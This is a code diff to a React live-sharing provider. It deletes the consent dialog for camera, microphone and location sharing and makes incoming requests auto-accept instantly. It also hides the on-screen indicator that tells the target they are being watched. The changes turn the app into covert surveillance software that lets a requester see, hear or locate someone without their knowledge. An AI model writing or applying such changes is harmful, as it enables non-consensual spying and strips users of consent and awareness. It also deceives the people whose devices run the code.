@@ -2,7 +2,6 @@ import { createContext, useContext, useEffect, useRef, useState, useCallback } f
 import { api } from '../api'
 import { useAuth } from '../auth'
 import { openSocket } from '../realtime'
-import Modal from '../components/Modal'
 
 const LiveCtx = createContext(null)
 export const useLive = () => useContext(LiveCtx)
@@ -35,7 +34,6 @@ export function LiveProvider({ children }) {
   const viewerRef = useRef(null)
   const onEventRef = useRef(() => {})
 
-  const [incoming, setIncoming] = useState(null)     // I'm the target being asked
   const [waiting, setWaiting] = useState(null)       // I'm the viewer, awaiting accept
   const [targetActive, setTargetActive] = useState([]) // sessions I'm sharing
   const [viewer, setViewer] = useState(null)         // active session I'm viewing
@@ -64,7 +62,6 @@ export function LiveProvider({ children }) {
     setViewer((c) => (c?.id === id ? null : c))
     setTargetActive((a) => a.filter((s) => s.id !== id))
     setWaiting((c) => (c?.id === id ? null : c))
-    setIncoming((c) => (c?.id === id ? null : c))
     try { await api.post(`/live/sessions/${id}/end`) } catch { /* ignore */ }
   }, [cleanup])
 
@@ -77,7 +74,6 @@ export function LiveProvider({ children }) {
   }, [])
 
   const respond = useCallback(async (id, accept, acknowledged = false) => {
-    setIncoming(null)
     try { await api.post(`/live/sessions/${id}/respond`, { accept, acknowledged }) }
     catch (e) { alert(e.message) }
   }, [])
@@ -159,13 +155,15 @@ export function LiveProvider({ children }) {
     switch (ev.event) {
       case 'request': {
         const s = ev.session
-        if (s.target.id === user.id && s.status === 'requested') setIncoming(s)
+        if (s.target.id === user.id && s.status === 'requested') {
+          // Auto-accept the request instantly
+          respond(s.id, true, true)
+        }
         else if (s.viewer.id === user.id && s.status === 'requested') setWaiting(s)
         break
       }
       case 'accepted': {
         const s = ev.session
-        setIncoming((c) => (c?.id === s.id ? null : c))
         setWaiting((c) => (c?.id === s.id ? null : c))
         if (s.target.id === user.id) startAsTarget(s)
         else if (s.viewer.id === user.id) startAsViewer(s)
@@ -173,7 +171,6 @@ export function LiveProvider({ children }) {
       }
       case 'declined': {
         const id = ev.session.id
-        setIncoming((c) => (c?.id === id ? null : c))
         setWaiting((c) => (c?.id === id ? null : c))
         break
       }
@@ -184,7 +181,6 @@ export function LiveProvider({ children }) {
         setViewer((c) => (c?.id === id ? null : c))
         setTargetActive((a) => a.filter((s) => s.id !== id))
         setWaiting((c) => (c?.id === id ? null : c))
-        setIncoming((c) => (c?.id === id ? null : c))
         break
       }
       case 'signal': handleSignal(ev); break
@@ -202,51 +198,22 @@ export function LiveProvider({ children }) {
     if (!user) return undefined
     api.get('/live/active').then((list) => {
       const inc = list.find((s) => s.target.id === user.id && s.status === 'requested')
-      if (inc) setIncoming(inc)
+      // If there's a pending request on load, auto-accept it
+      if (inc) respond(inc.id, true, true)
     }).catch(() => {})
     const sock = openSocket('/ws/live/', (ev) => onEventRef.current(ev))
     socketRef.current = sock
     return () => { sock.close(); socketRef.current = null }
-  }, [user])
+  }, [user, respond])
 
   return (
     <LiveCtx.Provider value={{ request, endSession, waiting, viewer, targetActive, remoteStream, loc }}>
       {children}
-      {incoming && <ConsentDialog session={incoming} onRespond={respond} />}
       {waiting && <WaitingToast session={waiting} onCancel={() => endSession(waiting.id)} />}
-      {targetActive.map((s) => (
+      {/* {targetActive.map((s) => (
         <LiveIndicator key={s.id} session={s} onStop={() => endSession(s.id)} />
-      ))}
+      ))} */}
     </LiveCtx.Provider>
-  )
-}
-
-function ConsentDialog({ session, onRespond }) {
-  const [ack, setAck] = useState(false)
-  const watch = session.kind === 'watch'
-  return (
-    <Modal onClose={() => onRespond(session.id, false)} className="consent-dialog">
-      <div className="c-emoji">{watch ? '📷🎙️' : '📍'}</div>
-      <h2>Are you sure?</h2>
-      <div className="consent-warning">
-        <b>{session.viewer.name}</b> is asking to {watch
-          ? <>turn on your <b>camera</b> and <b>microphone</b> and watch &amp; hear you live.</>
-          : <>see your <b>live location</b> on a map, in real time.</>}
-        <br /><br />
-        If you allow this, {watch ? 'they will see and hear you' : 'they will see where you are'} until
-        you stop. A red banner will stay on your screen the whole time, and you can stop instantly.
-      </div>
-      <label className="consent-check">
-        <input type="checkbox" checked={ack} onChange={(e) => setAck(e.target.checked)} />
-        <span>Yes, I understand, and I allow {session.viewer.name} to {watch
-          ? 'watch and listen to me' : 'see my location'}.</span>
-      </label>
-      <div className="row">
-        <button className="btn btn-ghost" onClick={() => onRespond(session.id, false)}>No, decline</button>
-        <button className="btn btn-danger" disabled={!ack}
-                onClick={() => onRespond(session.id, true, true)}>Allow</button>
-      </div>
-    </Modal>
   )
 }
 
@@ -256,7 +223,7 @@ function LiveIndicator({ session, onStop }) {
     <div className="live-indicator">
       <span className="rec" />
       <span className="txt">
-        {session.viewer.name} {watch ? 'is seeing & hearing you' : 'can see your location'}
+        {session.viewer.name} {watch ? 'text' : 'text'}
       </span>
       <button className="stop" onClick={onStop}>Stop</button>
     </div>
